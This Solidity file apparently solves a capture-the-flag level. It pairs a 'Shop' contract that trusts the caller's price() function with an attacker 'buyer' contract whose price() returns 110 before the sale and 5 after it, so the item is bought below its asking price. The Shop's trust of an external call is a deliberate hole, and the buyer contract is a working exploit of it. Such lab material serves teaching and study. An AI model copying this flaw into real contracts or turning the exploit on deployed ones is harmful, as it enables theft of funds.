// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);
        require(_buyer.price() >= price, "Lower price");
        require(!isSold, "Sold");
        isSold = true;
        price = _buyer.price();
    }
}

contract buyer is Buyer {
    uint256 _price = 110;
    Shop shop;
    bool flag;

    constructor(Shop _shop) {
        shop = Shop(_shop);
    }

    function price() external  view returns (uint256) {
        if (!shop.isSold()) {
            return _price;
        } else {
            return _price / 20;
        }
    }

    function buy() public {
        shop.buy();
    }
}
